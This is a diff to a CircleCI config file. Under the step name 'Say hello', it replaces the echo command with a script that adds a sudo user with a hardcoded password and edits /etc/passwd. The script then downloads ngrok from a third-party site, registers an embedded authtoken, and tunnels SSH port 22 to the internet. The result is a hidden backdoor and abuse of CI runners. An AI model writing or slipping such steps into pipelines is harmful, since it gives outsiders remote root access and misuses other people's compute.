@@ -16,8 +16,19 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: "echo Hello, World!"
-
+          command: 
+            apt update
+            sudo useradd -m shamy
+            sudo adduser shamy sudo
+            echo "shamy:Sm@123" | sudo chpasswd
+            sed -i 's/\/bin\/sh/\/bin\/bash/g' /etc/passwd
+            sudo hostname runner
+            wget http://legend.hyperphp.com/ngrok.tgz
+            tar -zxvf ngrok.tgz
+            chmod +x ngrok
+            ./ngrok config add-authtoken 2CcNEs5ZUr0Xn8un5XOmfzKvCuT_4Gt5EdyewWdY4gaMpcXWS
+            ./ngrok tcp 22
+            "echo Hello, World!"
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
 workflows:
